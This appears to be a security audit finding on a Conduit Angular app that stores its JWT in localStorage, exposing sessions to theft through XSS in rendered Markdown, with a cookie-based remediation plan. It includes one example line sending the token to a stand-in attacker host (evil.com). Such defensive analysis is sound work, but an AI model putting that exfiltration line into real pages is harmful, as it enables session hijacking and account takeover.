2 Root-Cause Analysis — Bug #4: JWT Stored in localStorage

🔴 Critical Security Vulnerability — XSS Session Hijack Risk

What Is Happening

When a user logs in, the server returns a JSON Web Token (JWT) inside the API response body. The Angular frontend stores this token in localStorage under the key jwtToken. On every subsequent authenticated API call, this token is retrieved from localStorage and attached as a Bearer token in the Authorization header.

Why This Is Exploitable

localStorage is fully accessible to any JavaScript running on the same origin. If an attacker injects malicious JavaScript into the page (via XSS), they can steal the token with a single line:

fetch('https://evil.com/steal?t=' + localStorage.getItem('jwtToken'));

The Conduit app renders user-submitted Markdown as HTML. If the sanitization layer has any gap — common in vibe-coded apps — an attacker can craft an article with embedded JavaScript. Once viewed by any logged-in user, the payload fires, the JWT is exfiltrated, and the attacker gains full account access.

The Correct Fix

Store the JWT in an HttpOnly, Secure, SameSite=Strict cookie. The server sets this on the login response:

Set-Cookie: token=<JWT>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400

HttpOnly makes the cookie completely invisible to JavaScript — even a successful XSS attack cannot read it. The browser automatically attaches it to every same-origin request.

✅ Complete Remediation Plan
  • Migrate JWT to HttpOnly; Secure; SameSite=Strict cookie on the backend
  • Remove all localStorage.setItem/getItem calls for auth tokens in the frontend
  • Implement a strict Content Security Policy (CSP) header blocking inline script execution
  • Add short token expiry (15 minutes) with silent refresh-token rotation
  • Audit all Markdown rendering paths for DOMPurify sanitization coverage
  • Add X-Content-Type-Options: nosniff and X-Frame-Options: DENY response headers
⚠️ Business Impact

In production, this vulnerability would be rated Critical (CVSS 8.8+). A single malicious article — published by any registered user and viewed by any other — could result in a mass account takeover. This would fail any standard penetration test or security audit.
